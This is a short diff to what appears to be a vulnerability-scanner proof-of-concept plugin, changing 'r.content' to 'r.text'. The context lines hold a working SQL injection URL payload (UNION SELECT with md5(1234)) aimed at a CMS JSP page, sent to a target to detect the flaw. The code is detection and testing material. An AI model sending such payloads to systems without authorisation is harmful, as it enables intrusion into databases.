@@ -49,7 +49,7 @@ class Poc(ABPoc):
             # ref http://www.wooyun.org/bugs/wooyun-2015-0135311
             payload = '/cms/webapp/critic/p_criticfrontlist.jsp?TID=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,md5(1234),NULL,NULL%23'
             r = requests.get(self.target + payload)
-            if '81dc9bdb52d04dc20036dbd8313ed055' in r.content:
+            if '81dc9bdb52d04dc20036dbd8313ed055' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
